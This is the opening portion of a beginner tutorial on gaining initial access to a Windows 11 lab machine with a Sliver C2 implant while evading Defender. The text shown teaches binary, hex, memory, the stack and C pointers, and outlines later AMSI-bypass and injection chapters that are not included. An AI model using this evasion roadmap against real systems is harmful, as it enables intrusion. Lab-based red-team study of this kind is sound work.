# INITIAL ACCESS WITH SLIVER C2
## Complete Guide - From Basics to Bypassing Windows Defender

---

# ABOUT THIS GUIDE

This guide teaches you how to run a Sliver implant on a Windows machine without Windows Defender catching it.

Before we do that, we need to learn how computers work. If you do not understand computers, you cannot understand hacking.

So we start from very basics. We go step by step. By the end, you will be able to:
- Understand what is happening inside the computer
- Write your own loader
- Bypass Defender
- Get shell on target machine

---

# YOUR LAB SETUP

| Computer | IP Address | What it is |
|----------|------------|------------|
| DC01 | 192.168.100.10 | Domain Controller (Windows Server) |
| WS01 | 192.168.100.20 | Target Computer (Windows 11 with Defender) |
| WS02 | 192.168.100.30 | Second Workstation (Windows 11) |
| Kali | 192.168.100.100| Your Attack Machine (Sliver is here) |

**Our Target:** WS01 (Windows 11 with Defender turned ON)

---

# TABLE OF CONTENTS

## PART 1: HOW COMPUTERS STORE INFORMATION
- Chapter 1: What is Binary
- Chapter 2: What is a Byte
- Chapter 3: What is Hexadecimal
- Chapter 4: How Numbers are Stored
- Chapter 5: How Text is Stored
- Chapter 6: What is the Difference Between Data and Code

## PART 2: HOW PROGRAMS RUN
- Chapter 7: What Does the CPU Do
- Chapter 8: What is Memory
- Chapter 9: What is the Stack
- Chapter 10: User Mode and Kernel Mode

## PART 3: LEARNING C PROGRAMMING
- Chapter 11: Setting Up C on Windows
- Chapter 12: What is a Variable
- Chapter 13: What is a Pointer
- Chapter 14: What is a Function
- Chapter 15: Arrays and Strings
- Chapter 16: What is Buffer Overflow

## PART 4: HOW SOURCE CODE BECOMES A PROGRAM
- Chapter 17: What is Compilation
- Chapter 18: What is Assembly Language
- Chapter 19: What is PE File Format
- Chapter 20: How Windows Loads a Program

## PART 5: WINDOWS INTERNALS
- Chapter 21: What is a Process
- Chapter 22: What is a Thread
- Chapter 23: What is Virtual Memory
- Chapter 24: What is Windows API
- Chapter 25: What is a DLL

## PART 6: SHELLCODE
- Chapter 26: What is Shellcode
- Chapter 27: How to Write Shellcode
- Chapter 28: What is a Shellcode Loader
- Chapter 29: What is Process Injection

## PART 7: COMMAND AND CONTROL
- Chapter 30: What is C2
- Chapter 31: How Sliver Works
- Chapter 32: Setting Up Sliver
- Chapter 33: Creating Your Payload

## PART 8: HOW DETECTION WORKS
- Chapter 34: How Defender Catches Malware
- Chapter 35: What is AMSI
- Chapter 36: What is ETW

## PART 9: BYPASSING DETECTION
- Chapter 37: How to Bypass AMSI
- Chapter 38: How to Use Direct Syscalls
- Chapter 39: How to Encrypt Your Payload
- Chapter 40: Other Evasion Methods

## PART 10: RUNNING THE ATTACK
- Chapter 41: Building Final Payload
- Chapter 42: Running on Target
- Chapter 43: Fixing Problems

## PART 11: EXTRA MATERIAL
- Chapter 44: Interview Questions
- Chapter 45: Important Commands
- Chapter 46: Common Errors and Solutions

---

# PART 1: HOW COMPUTERS STORE INFORMATION

---

# CHAPTER 1: What is Binary

## Introduction

Before we can understand hacking, we need to understand how computers store data.

Computers cannot understand words or numbers like we do. Computers only understand two things:
- OFF
- ON

We call OFF as **0**
We call ON as **1**

This is called **binary**. Everything in a computer is stored using only 0 and 1.

## How We Count Normally

In normal life, we count like this:

```
0, 1, 2, 3, 4, 5, 6, 7, 8, 9
```

When we reach 9, we have no more single digits. So we add one more place:

```
10, 11, 12, 13... and so on
```

We use 10 digits (0 to 9). This is called **decimal** system.

## How Computers Count

Computers only have 0 and 1. So they count differently.

```
0 = 0
1 = 1
```

Now what comes after 1? We have no more digits! So we add one more place:

```
10 = 2 (in decimal)
11 = 3 (in decimal)
```

Again no more options. Add one more place:

```
100 = 4 (in decimal)
101 = 5 (in decimal)
110 = 6 (in decimal)
111 = 7 (in decimal)
1000 = 8 (in decimal)
```

And so on.

## How to Read a Binary Number

Let me teach you a simple method.

Each position in binary has a value. Starting from the right:
- First position = 1
- Second position = 2
- Third position = 4
- Fourth position = 8
- Fifth position = 16
- Sixth position = 32
- Seventh position = 64
- Eighth position = 128

**See the pattern? Each position is double the previous one.**

## Example 1: What is 1011 in decimal?

Let us write the positions:

```
Position Values:    8    4    2    1
Binary Number:      1    0    1    1
```

Now add the values where binary has 1:
- 8 (yes, binary has 1)
- 4 (no, binary has 0)
- 2 (yes, binary has 1)
- 1 (yes, binary has 1)

Answer = 8 + 2 + 1 = **11**

So binary 1011 = decimal 11.

## Example 2: What is 11001 in decimal?

```
Position Values:   16    8    4    2    1
Binary Number:      1    1    0    0    1
```

Add where binary has 1:
- 16 (yes)
- 8 (yes)
- 4 (no)
- 2 (no)
- 1 (yes)

Answer = 16 + 8 + 1 = **25**

So binary 11001 = decimal 25.

## Example 3: How to Convert Decimal 50 to Binary

Now the opposite direction. We have 50 and want binary.

**Step 1:** Write position values that fit in 50

```
32    16    8    4    2    1
```

(64 is bigger than 50, so we stop at 32)

**Step 2:** Check which values fit

- Does 32 fit in 50? Yes. 50 - 32 = 18 left. Write 1.
- Does 16 fit in 18? Yes. 18 - 16 = 2 left. Write 1.
- Does 8 fit in 2? No. Write 0.
- Does 4 fit in 2? No. Write 0.
- Does 2 fit in 2? Yes. 2 - 2 = 0 left. Write 1.
- Does 1 fit in 0? No. Write 0.

**Step 3:** Read the binary number

```
32    16    8    4    2    1
 1     1    0    0    1    0
```

Answer: **110010**

Let us verify: 32 + 16 + 2 = 50 ✓

## Why is This Important?

Everything in a computer is binary:
- The letter 'A' is stored as binary
- The number 1000 is stored as binary
- Your password is stored as binary
- Shellcode is binary

When we encrypt or hide our payload, we are changing the binary. So you must understand it.

## Practice Problems

Try these yourself:

**Convert binary to decimal:**
1. 1010 = ?
2. 11111 = ?
3. 100000 = ?

**Convert decimal to binary:**
1. 20 = ?
2. 100 = ?
3. 255 = ?

## Answers

**Binary to decimal:**
1. 1010 = 8 + 2 = 10
2. 11111 = 16 + 8 + 4 + 2 + 1 = 31
3. 100000 = 32

**Decimal to binary:**
1. 20 = 10100 (16 + 4)
2. 100 = 1100100 (64 + 32 + 4)
3. 255 = 11111111 (128 + 64 + 32 + 16 + 8 + 4 + 2 + 1)

---

# CHAPTER 2: What is a Byte

## Introduction

One binary digit (0 or 1) is called a **bit**.

One bit can only store 2 values - either 0 or 1. That is not very useful.

So we group 8 bits together. This group of 8 bits is called a **byte**.

## How Many Values Can a Byte Store?

With 1 bit: 2 values (0 or 1)
With 2 bits: 4 values (00, 01, 10, 11)
With 3 bits: 8 values
With 4 bits: 16 values
With 5 bits: 32 values
With 6 bits: 64 values
With 7 bits: 128 values
With 8 bits: 256 values

**A byte can store 256 different values: from 0 to 255.**

## Example: The Byte Value 65

Let us see what 65 looks like in binary (as a byte).

First, position values for 8 bits:
```
128    64    32    16    8    4    2    1
```

65 = 64 + 1

So:
```
128    64    32    16    8    4    2    1
  0     1     0     0    0    0    0    1
```

The byte is: **01000001**

## Why 65 is Important

In computers, each letter is stored as a number. There is a standard list called **ASCII**.

In ASCII:
- 'A' = 65
- 'B' = 66
- 'C' = 67
- ... and so on

So when you type 'A' on keyboard, the computer stores 65 (which is 01000001 in binary).

## Some Important Byte Values

| Value | What It Means |
|-------|---------------|
| 0 | Often means "end" or "nothing" |
| 32 | Space character |
| 48 to 57 | Digits '0' to '9' |
| 65 to 90 | Capital letters 'A' to 'Z' |
| 97 to 122 | Small letters 'a' to 'z' |
| 255 | Maximum byte value |

## Bigger Numbers Need More Bytes

One byte can only store 0 to 255.

For bigger numbers, we use more bytes:

| Name | How Many Bytes | Can Store |
|------|----------------|-----------|
| Byte | 1 | 0 to 255 |
| Word | 2 | 0 to 65,535 |
| DWORD | 4 | 0 to about 4 billion |
| QWORD | 8 | 0 to very very big number |

When we program in C or call Windows API, we will see DWORD and QWORD many times.

---

# CHAPTER 3: What is Hexadecimal

## The Problem

Binary is hard to read. Look at this:

```
01001000 01100101 01101100 01101100 01101111
```

That is 5 bytes. Very hard to read.

Decimal (normal numbers) is easier: 72, 101, 108, 108, 111

But decimal is also not perfect. Sometimes one byte is 2 digits (72), sometimes 3 digits (255). Hard to line up.

## The Solution: Hexadecimal

Hexadecimal uses 16 digits instead of 10.

The 16 digits are: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F

| Decimal | Hexadecimal |
|---------|-------------|
| 0 | 0 |
| 1 | 1 |
| 2 | 2 |
| ... | ... |
| 9 | 9 |
| 10 | A |
| 11 | B |
| 12 | C |
| 13 | D |
| 14 | E |
| 15 | F |

## Why Hexadecimal is Perfect for Bytes

One hex digit can show values 0 to 15.
In binary, that is 4 bits (0000 to 1111).

One byte is 8 bits.
So one byte is exactly 2 hex digits.

This is very clean:

| Decimal | Binary | Hexadecimal |
|---------|--------|-------------|
| 0 | 00000000 | 00 |
| 15 | 00001111 | 0F |
| 65 | 01000001 | 41 |
| 255 | 11111111 | FF |

Every byte is exactly 2 hex characters. Very easy to read.

## How to Read Hexadecimal

Hexadecimal is written with "0x" in front. So 0x41 means hexadecimal 41.

To convert 0x41 to decimal:
- First digit: 4
- Second digit: 1
- Value = (4 × 16) + (1 × 1) = 64 + 1 = 65

To convert 0xFF to decimal:
- First digit: F = 15
- Second digit: F = 15
- Value = (15 × 16) + (15 × 1) = 240 + 15 = 255

## Example: "Hello" in Hexadecimal

Each letter has a number (ASCII):
- H = 72 = 0x48
- e = 101 = 0x65
- l = 108 = 0x6C
- l = 108 = 0x6C
- o = 111 = 0x6F

So "Hello" in hex is: **48 65 6C 6C 6F**

This is what you see in hex editors and debuggers. Now you know how to read it.

## Where You Will See Hex

**Shellcode:**
```
\x48\x89\x5c\x24\x08
```
Each \x followed by 2 characters is one byte in hex.

**Memory addresses:**
```
0x00007FFE12340000
```

**In debuggers and tools:**
```
Address   Bytes                    Text
00000000  48 65 6C 6C 6F 00       Hello.
```

## Practice

**Convert hex to decimal:**
- 0x10 = ?
- 0x20 = ?
- 0x7F = ?

**Convert decimal to hex:**
- 16 = ?
- 100 = ?
- 200 = ?

## Answers

**Hex to decimal:**
- 0x10 = (1 × 16) + 0 = 16
- 0x20 = (2 × 16) + 0 = 32
- 0x7F = (7 × 16) + 15 = 112 + 15 = 127

**Decimal to hex:**
- 16 = 0x10
- 100 = 0x64 (100 ÷ 16 = 6 remainder 4)
- 200 = 0xC8 (200 ÷ 16 = 12 remainder 8, 12 = C)

---

---

# CHAPTER 4: How Numbers are Stored in Memory

## Introduction

Now we know what bytes are. But where do bytes live?

They live in **memory** (also called RAM).

Think of memory like a very long line of boxes. Each box can hold one byte. Each box has a number called its **address**.

```
Address:  0    1    2    3    4    5    6    7    ...
         [  ] [  ] [  ] [  ] [  ] [  ] [  ] [  ] ...
```

When we store something, we put bytes in these boxes.

## Storing a Small Number (0 to 255)

If the number is between 0 and 255, it fits in one byte.

**Example: Storing the number 42**

42 in binary is 00101010.

We put this in one box:

```
Address:  1000
         [00101010]  = 42
```

Simple!

## Storing a Bigger Number

But what if the number is bigger than 255?

**Example: Storing the number 1000**

1000 is bigger than 255, so it does not fit in one byte.

We need 2 bytes.

First, let us convert 1000 to binary:

1000 = 512 + 256 + 128 + 64 + 32 + 8 = ?

Wait, let me do it properly:
- 1000 ÷ 2 = 500, remainder 0
- 500 ÷ 2 = 250, remainder 0
- 250 ÷ 2 = 125, remainder 0
- 125 ÷ 2 = 62, remainder 1
- 62 ÷ 2 = 31, remainder 0
- 31 ÷ 2 = 15, remainder 1
- 15 ÷ 2 = 7, remainder 1
- 7 ÷ 2 = 3, remainder 1
- 3 ÷ 2 = 1, remainder 1
- 1 ÷ 2 = 0, remainder 1

Reading from bottom to top: 1111101000

That is 10 bits. We need at least 2 bytes (16 bits).

With padding: 0000001111101000

Split into 2 bytes:
- Byte 1: 00000011 = 0x03
- Byte 2: 11101000 = 0xE8

So 1000 in hex is 0x03E8.

## Little Endian: The Backward Order

Now, which byte do we store first?

On Intel/AMD computers (which is what we use), we store the **smaller part first**. This is called **little endian**.

So for 1000 (0x03E8):
- First box: E8 (the smaller/right part)
- Second box: 03 (the bigger/left part)

```
Address:  1000   1001
         [0xE8] [0x03]
```

This looks backward, but that is how Intel works.

## Why Little Endian Matters for Hacking

When you write an exploit and you want to put an address like 0x00401000 in memory, you must write it backward:

```
Address bytes: 00 40 10 00

In memory: 00 10 40 00  (reversed)
```

If you forget this, your exploit will not work.

## Common Number Sizes

| Name | Bytes | Range | Example Use |
|------|-------|-------|-------------|
| BYTE | 1 | 0-255 | Characters, small flags |
| WORD | 2 | 0-65535 | Port numbers |
| DWORD | 4 | 0 to 4 billion | Many Windows API values |
| QWORD | 8 | Very big | Memory addresses (64-bit) |

---

# CHAPTER 5: How Text is Stored in Memory

## Introduction

Now we know how numbers are stored. What about text?

The answer is simple: **text is also just numbers**.

Each letter has a number. This is called **ASCII** (American Standard Code for Information Interchange).

## The ASCII Table (Important Parts)

| Character | Decimal | Hex |
|-----------|---------|-----|
| (space) | 32 | 0x20 |
| 0 | 48 | 0x30 |
| 1 | 49 | 0x31 |
| 9 | 57 | 0x39 |
| A | 65 | 0x41 |
| B | 66 | 0x42 |
| Z | 90 | 0x5A |
| a | 97 | 0x61 |
| b | 98 | 0x62 |
| z | 122 | 0x7A |

**Notice:** Capital 'A' is 65. Small 'a' is 97. The difference is 32.

To change 'A' to 'a': add 32.
To change 'a' to 'A': subtract 32.

## Example: Storing "Hi" in Memory

The word "Hi":
- H = 72 = 0x48
- i = 105 = 0x69

In memory:

```
Address:  1000   1001
         [0x48] [0x69]
           H      i
```

## The Null Terminator

How does the computer know where a text ends?

Answer: We put a special byte at the end. This byte is **0** (zero). It is called the **null terminator** or **null byte**.

**Example: Storing "Hi" as a proper string**

```
Address:  1000   1001   1002
         [0x48] [0x69] [0x00]
           H      i    END
```

The 0x00 at the end tells the computer: "The string ends here."

## Why Null Terminator is Important for Hacking

Many programs read strings until they see 0x00.

If you can remove or overwrite the 0x00, the program will keep reading into other memory. This can cause:
- Information leak (reading data you should not see)
- Crash (reading invalid memory)
- Exploit opportunity

Also, if your shellcode contains 0x00 bytes, it might get cut off early. That is why we often need **null-free shellcode**.

## Example: Storing "Hello" in Memory

Let us trace exactly where each byte goes.

"Hello" in ASCII:
- H = 0x48
- e = 0x65
- l = 0x6C
- l = 0x6C
- o = 0x6F
- (null) = 0x00

```
Address:  1000   1001   1002   1003   1004   1005
         [0x48] [0x65] [0x6C] [0x6C] [0x6F] [0x00]
           H      e      l      l      o    END
```

Total: 6 bytes (5 for letters + 1 for null).

---

# CHAPTER 6: The Difference Between Data and Code

## Introduction

This is a very important chapter. Pay attention.

We have learned that computers store everything as bytes. Letters are bytes. Numbers are bytes.

But **code** (instructions for the computer) is also bytes.

So how does the computer know if bytes are data or code?

## The Answer: Context

The bytes themselves do not say "I am data" or "I am code".

The **location** and **how they are used** decides this.

Let me explain with an example.

## Example: The Byte 0x48

The byte 0x48 can mean different things:

**As text:** 0x48 = 72 = letter 'H'

**As code (on x64):** 0x48 is the "REX.W" prefix. It tells the CPU "the next instruction uses 64-bit size".

Same byte. Different meaning.

## How Does the Computer Decide?

When the CPU runs a program, it has a special pointer called the **Instruction Pointer** (IP or RIP on 64-bit).

This pointer says: "The next instruction is at this address."

The CPU reads bytes from that address and treats them as code.

If you can change where the instruction pointer points, you can make the CPU execute your own bytes as code.

## Example: Data Becoming Code

Imagine this memory:

```
Address:  1000   1001   1002   1003
Data:    [0x48] [0x65] [0x6C] [0x6C]  = "Hell"
```

Normally, this is just the text "Hell".

But if an attacker can make the instruction pointer point to address 1000, the CPU will try to execute these bytes as code.

0x48 0x65 means something in x64 assembly. The CPU will run it.

**This is the basic idea of shellcode.**

We put bytes in memory (maybe disguised as data or input). Then we make the CPU execute those bytes.

## Why This is Powerful

If you give a program input, you are putting bytes in its memory.

If you can also control the instruction pointer, those input bytes become code that runs.

This is how many exploits work:
1. Send special input (which is actually code in disguise)
2. Trigger a bug that changes the instruction pointer
3. The instruction pointer now points to your input
4. Your input runs as code
5. You have control

## What is Shellcode Then?

Shellcode is bytes that are designed to work as code.

When you create a Sliver implant, Sliver gives you shellcode - a sequence of bytes.

These bytes, when executed as code, will connect back to your C2 server.

Your job is to:
1. Get these bytes into the target's memory
2. Make the CPU execute them
3. Avoid detection while doing this

---

*End of Portion 2 - Chapters 4, 5, 6*

*What you learned:*
- *Numbers bigger than 255 use multiple bytes*
- *Intel computers store bytes in little endian (backward) order*
- *Text is stored as numbers using ASCII table*
- *Strings end with null byte (0x00)*
- *Same bytes can be data or code - it depends on how they are used*
- *Shellcode is bytes designed to run as code*

*Next portion: How programs actually run (CPU, memory, stack)*

---

# PART 2: HOW PROGRAMS RUN

---

# CHAPTER 7: What Does the CPU Do

## Introduction

The CPU (Central Processing Unit) is the brain of the computer.

But what does it actually do?

Very simple: **The CPU reads instructions and follows them. One by one.**

That is it. Nothing more.

## The Instruction Cycle

The CPU does only 3 things, over and over, billions of times per second:

1. **Fetch** - Get the next instruction from memory
2. **Decode** - Understand what the instruction says to do
3. **Execute** - Do what the instruction says

Then repeat with the next instruction.

## Example: Adding 5 + 3

Let us see how the CPU adds 5 + 3.

The instructions might be:
1. Put the number 5 in register A
2. Put the number 3 in register B
3. Add register A and register B, put result in register A
4. Done

The CPU will:
- **Fetch** instruction 1, **decode** it, **execute** it (now register A = 5)
- **Fetch** instruction 2, **decode** it, **execute** it (now register B = 3)
- **Fetch** instruction 3, **decode** it, **execute** it (now register A = 8)

## What are Registers?

Registers are tiny storage boxes **inside** the CPU itself.

Memory (RAM) is far from the CPU. Reading from memory is slow.

Registers are inside the CPU, so reading them is very fast.

The CPU does most work using registers, not memory directly.

**Important registers on x64 (64-bit Intel/AMD):**

| Register | Common Use |
|----------|------------|
| RAX | General purpose, return values from functions |
| RBX | General purpose |
| RCX | Counter, 1st function parameter (Windows) |
| RDX | 2nd function parameter (Windows) |
| RSI | Source index |
| RDI | Destination index |
| RSP | Stack pointer (top of stack) |
| RBP | Base pointer (bottom of stack frame) |
| R8-R15 | Additional general purpose |
| RIP | Instruction pointer (address of next instruction) |

## The Most Important Register: RIP

**RIP** (also called the instruction pointer) contains the address of the **next instruction** to execute.

Every time the CPU finishes an instruction, it looks at RIP to know where the next instruction is.

**This is critical for hacking.**

If you can change RIP, you control what the CPU does next.

When a buffer overflow overwrites a return address, it changes where RIP will point. The CPU then executes whatever is at that address - which could be your shellcode.

## How Fast is the CPU?

A modern CPU runs at about 3-4 GHz.

1 GHz = 1,000,000,000 cycles per second.

At 4 GHz, the CPU can do about 4 billion operations per second.

This is why computers seem instant - they are doing billions of things between your keystrokes.

---

# CHAPTER 8: What is Memory

## Introduction

We talked about memory earlier (where bytes live). Now let us understand it better.

## Memory is Just Numbered Boxes

Imagine billions of boxes in a line. Each box:
- Holds 1 byte (8 bits, value 0-255)
- Has an address (which box number it is)

```
Address:  0     1     2     3     4     5     ...
         [ ]   [ ]   [ ]   [ ]   [ ]   [ ]   ...
```

When we say "write to address 1000", we put a byte in box number 1000.

When we say "read from address 1000", we look at what is in box number 1000.

## How Big is Memory?

On a 64-bit system, addresses can be up to 64 bits (0 to 2^64 - 1).

But in practice, current CPUs use about 48 bits for addresses.

2^48 = 281,474,976,710,656 bytes = 256 TB (terabytes)

Your computer probably has 8-32 GB of RAM, which is much less. But the address space can be very large.

## Memory Addresses in Different Sizes

| Bits | Bytes | Max Address | Max Memory |
|------|-------|-------------|------------|
| 16 | 2 | 65,535 | 64 KB |
| 32 | 4 | 4,294,967,295 | 4 GB |
| 64 | 8 | Very big | 16 EB (theoretical) |

On 32-bit Windows, programs could only use about 2 GB of memory. This is why 64-bit systems are now standard.

## Reading and Writing Memory

The CPU can only do two things with memory:
1. **Read** - Get the value at an address
2. **Write** - Put a value at an address

That is it. Everything else is built from these two operations.

## Example: What Happens When You Run a Program

Let us say you open notepad.exe:

1. Windows reads notepad.exe from disk
2. Windows allocates memory for notepad (let us say addresses 1000 to 50000)
3. Windows copies notepad's code and data into that memory
4. Windows sets RIP to the starting address (let us say 1000)
5. CPU starts executing from address 1000
6. Notepad runs

When notepad closes, Windows frees that memory (addresses 1000-50000 become available again).

---

# CHAPTER 9: What is the Stack

## Introduction

When programs run, they need temporary storage. This is called the **stack**.

## Why Do Programs Need a Stack?

Think about this: You are running function A. Function A calls function B. Function B calls function C.

When C finishes, you need to go back to B. When B finishes, you need to go back to A.

How does the computer remember where to go back to?

Answer: The stack.

## How the Stack Works

The stack is a region of memory that grows and shrinks.

**Important rule:** Last in, first out (LIFO).

Think of a stack of plates:
- You put a plate on top (push)
- You take a plate from top (pop)
- You cannot take from the middle

## Push and Pop

**Push:** Add data to the top of the stack.

**Pop:** Remove data from the top of the stack.

## Example: Function Calls

Let us trace what happens:

```
Function A runs.
Function A calls Function B.
    - PUSH the return address (where to go back in A)
    - Jump to Function B
Function B runs.
Function B calls Function C.
    - PUSH the return address (where to go back in B)
    - Jump to Function C
Function C runs.
Function C finishes.
    - POP the return address (address in B)
    - Jump back to B
Function B finishes.
    - POP the return address (address in A)
    - Jump back to A
Function A continues.
```

The stack remembered the return addresses for us.

## What Else is on the Stack?

The stack stores:
- **Return addresses** - Where to go back after function ends
- **Local variables** - Variables created inside a function
- **Function parameters** - Values passed to a function
- **Saved registers** - Register values that need to be restored

## Stack Direction

On x86/x64, the stack grows **downward** (toward lower addresses).

When you push, the stack pointer (RSP) goes down.
When you pop, the stack pointer (RSP) goes up.

```
High Address
-----------------
| Old data      |
-----------------
| Return addr   |  ← Stack was here before call
-----------------
| Local vars    |  ← Stack is here now (lower address)
-----------------
Low Address
```

## Why the Stack is Important for Hacking

**Buffer Overflow Attack:**

If a local variable (like a buffer) is on the stack, and you write too much data into it, you can overwrite:
- Other local variables
- The saved return address

If you overwrite the return address with your own address, when the function returns, it will jump to YOUR address instead of the real one.

If your address points to shellcode, the shellcode runs.

This is the classic stack buffer overflow.

---

# CHAPTER 10: User Mode and Kernel Mode

## Introduction

Not all code has the same power.

The CPU can run in different modes. The two important ones are:
- **User Mode** - Normal programs run here (limited power)
- **Kernel Mode** - The operating system runs here (full power)

## Why Two Modes?

Imagine if any program could do anything:
- Delete any file
- Read any memory
- Control hardware directly
- Crash the whole computer

That would be dangerous. A buggy or malicious program could destroy everything.

So the CPU has restrictions.

## User Mode

When running in user mode:
- Cannot access hardware directly
- Cannot access other programs' memory (normally)
- Cannot run certain CPU instructions
- If something goes wrong, only that program crashes

Normal programs (browsers, notepad, your game) run in user mode.

## Kernel Mode

When running in kernel mode:
- Can access any memory
- Can control hardware
- Can run any instruction
- If something goes wrong, the whole computer crashes (Blue Screen)

The Windows kernel, drivers, and some security software run in kernel mode.

## How Programs Ask for Help

Since user mode programs cannot do many things directly, they ask the kernel to do it for them.

This is called a **system call** (or syscall).

**Example: Opening a file**

1. Your program (user mode) wants to open a file
2. Your program calls the Windows API function like CreateFile()
3. CreateFile() makes a syscall to the kernel
4. The kernel (kernel mode) actually opens the file
5. The result is returned to your program

## Why This Matters for Hacking

**Security software often runs in kernel mode.** They can see everything.

**Your shellcode runs in user mode.** It is limited.

But most attacks happen in user mode. You can still do a lot:
- Call Windows APIs
- Create files
- Make network connections
- Run commands
- Take screenshots

For EDR evasion, we often try to avoid the APIs that are monitored. Or we call the kernel directly (direct syscalls).

## User Mode to Kernel Mode Transition

When you make a syscall:

1. Your program is running in user mode
2. You trigger a syscall (special instruction)
3. CPU switches to kernel mode
4. Kernel handles the request
5. CPU switches back to user mode
6. Your program continues

The CPU has hardware support for this transition. It is fast and secure.

---

*End of Portion 3 - Chapters 7, 8, 9, 10*

*What you learned:*
- *CPU fetches, decodes, and executes instructions one by one*
- *RIP register points to the next instruction*
- *Memory is just numbered boxes that hold bytes*
- *Stack is temporary storage, grows downward, last-in-first-out*
- *User mode has limited power, kernel mode has full power*
- *Programs use syscalls to ask the kernel for help*

*Next portion: C Programming basics*

---

# PART 3: LEARNING C PROGRAMMING

---

# CHAPTER 11: Setting Up C on Windows

## Introduction

C is the programming language we will use to build our shellcode loader.

Why C?
- Windows is mostly written in C
- We can talk to Windows directly with C
- C gives us control over memory (which we need for shellcode)
- Most offensive tools are written in C

## What You Need

We need a C compiler. A compiler takes your code and turns it into an .exe file.

**Option 1: Visual Studio (Microsoft)**

This is the best option for Windows.

1. Download Visual Studio from: https://visualstudio.microsoft.com/
2. Select "Community" edition (free)
3. During install, select "Desktop development with C++"
4. This includes the C compiler (cl.exe)

**Option 2: MinGW (Simpler)**

If Visual Studio is too big:

1. Download MinGW from: https://www.mingw-w64.org/
2. Install it
3. This gives you gcc.exe (GNU C Compiler)

For this guide, I will show both ways.

## Your First C Program

Create a file called `hello.c` with this content:

```c
#include <stdio.h>

int main() {
    printf("Hello, I am learning C!\n");
    return 0;
}
```

## Compiling and Running

**With Visual Studio:**

Open "Developer Command Prompt for VS" and type:
```
cl hello.c
hello.exe
```

**With MinGW:**
```
gcc hello.c -o hello.exe
hello.exe
```

You should see:
```
Hello, I am learning C!
```

Congratulations! You wrote and ran your first C program.

## Understanding the Code

Let me explain each line:

```c
#include <stdio.h>
```
This line says "I want to use input/output functions". `printf` comes from here.

```c
int main() {
```
Every C program starts at `main()`. This is the entry point.

```c
    printf("Hello, I am learning C!\n");
```
This prints text to the screen. `\n` means new line.

```c
    return 0;
```
This tells Windows "the program finished successfully". 0 means success.

```c
}
```
This closes the main function.

---

# CHAPTER 12: What is a Variable

## Introduction

A variable is a named box in memory that holds a value.

## Example: Age Checker Program

Let us make a program that checks if someone can vote (age 18 or above).

```c
#include <stdio.h>

int main() {
    int age;           // Create a box called "age"
    
    age = 25;         // Put the number 25 in the box
    
    printf("Your age is: %d\n", age);
    
    if (age >= 18) {
        printf("You can vote!\n");
    } else {
        printf("You cannot vote yet.\n");
    }
    
    return 0;
}
```

Output:
```
Your age is: 25
You can vote!
```

## What Happened?

```c
int age;
```
This creates a box in memory. The box is named "age". The `int` means it holds whole numbers (integers).

```c
age = 25;
```
This puts the number 25 into the box.

```c
printf("Your age is: %d\n", age);
```
This prints the value inside the box. `%d` means "put a number here".

## Common Variable Types

| Type | What It Holds | Size | Range |
|------|---------------|------|-------|
| char | One character or small number | 1 byte | -128 to 127 |
| int | Whole numbers | 4 bytes | -2 billion to +2 billion |
| long | Bigger whole numbers | 8 bytes | Very big |
| float | Decimal numbers | 4 bytes | Numbers with decimal point |

## Example: Different Variable Types

```c
#include <stdio.h>

int main() {
    char letter = 'A';           // One character
    int count = 100;             // Whole number
    float price = 29.99;         // Decimal number
    
    printf("Letter: %c\n", letter);   // %c for character
    printf("Count: %d\n", count);     // %d for integer
    printf("Price: %.2f\n", price);   // %.2f for float with 2 decimals
    
    return 0;
}
```

Output:
```
Letter: A
Count: 100
Price: 29.99
```

## Example: Simple Calculator

```c
#include <stdio.h>

int main() {
    int a = 10;
    int b = 3;
    
    int sum = a + b;
    int difference = a - b;
    int product = a * b;
    int quotient = a / b;
    int remainder = a % b;   // % gives remainder
    
    printf("a = %d, b = %d\n", a, b);
    printf("Sum: %d\n", sum);
    printf("Difference: %d\n", difference);
    printf("Product: %d\n", product);
    printf("Quotient: %d\n", quotient);
    printf("Remainder: %d\n", remainder);
    
    return 0;
}
```

Output:
```
a = 10, b = 3
Sum: 13
Difference: 7
Product: 30
Quotient: 3
Remainder: 1
```

## Where Do Variables Live in Memory?

When you create a variable, it gets a memory address.

```c
#include <stdio.h>

int main() {
    int age = 25;
    
    printf("Value of age: %d\n", age);
    printf("Address of age: %p\n", &age);  // & gives address
    
    return 0;
}
```

Output (address will be different on your computer):
```
Value of age: 25
Address of age: 0x7fff5c3a2abc
```

The `&age` gives the memory address where age is stored. This is a hexadecimal number!

---

# CHAPTER 13: What is a Pointer

## Introduction

This is the most important chapter for hacking. Pay close attention.

A **pointer** is a variable that holds a **memory address**.

Normal variables hold values (like 25).
Pointers hold addresses (like 0x7fff5c3a2abc).

## Why Pointers Matter

With pointers, you can:
- Access memory directly
- Modify memory at any address
- Pass large data without copying
- Write shellcode loaders

## Creating a Pointer

```c
#include <stdio.h>

int main() {
    int age = 25;       // Normal variable
    int *ptr;           // Pointer variable (the * means pointer)
    
    ptr = &age;         // ptr now holds the ADDRESS of age
    
    printf("Value of age: %d\n", age);
    printf("Address of age: %p\n", &age);
    printf("Value of ptr: %p\n", ptr);        // Same as &age
    printf("Value at ptr: %d\n", *ptr);       // *ptr reads the value
    
    return 0;
}
```

Output:
```
Value of age: 25
Address of age: 0x7fff5c3a2abc
Value of ptr: 0x7fff5c3a2abc
Value at ptr: 25
```

## Understanding the Symbols

| Symbol | Meaning |
|--------|---------|
| `int age` | Normal variable holding an integer |
| `int *ptr` | Pointer variable (holds an address) |
| `&age` | "Address of" - gives the address of age |
| `*ptr` | "Value at" - gives the value at the address ptr holds |

## Example: Changing a Value Through a Pointer

```c
#include <stdio.h>

int main() {
    int age = 25;
    int *ptr = &age;    // ptr points to age
    
    printf("Before: age = %d\n", age);
    
    *ptr = 30;          // Change the value at that address
    
    printf("After: age = %d\n", age);
    
    return 0;
}
```

Output:
```
Before: age = 25
After: age = 30
```

We changed `age` without using `age` directly. We changed it through the pointer.

This is exactly what happens in shellcode injection - we write to memory addresses.

## Example: Pointer to a Character (String)

```c
#include <stdio.h>

int main() {
    char *message = "Hello";
    
    printf("%s\n", message);           // Print whole string
    printf("First letter: %c\n", *message);     // First character
    printf("Second letter: %c\n", *(message+1));  // Second character
    
    return 0;
}
```

Output:
```
Hello
First letter: H
Second letter: e
```

`message` points to the first character 'H'. To get 'e', we add 1 to the pointer.

## Why This is Important for Shellcode

When you have shellcode like:
```c
unsigned char shellcode[] = "\x48\x89\x5c\x24...";
```

`shellcode` is actually a pointer to the first byte. We can pass this pointer to Windows APIs to execute it.

---

# CHAPTER 14: What is a Function

## Introduction

A function is a block of code that does a specific job. You call it when you need that job done.

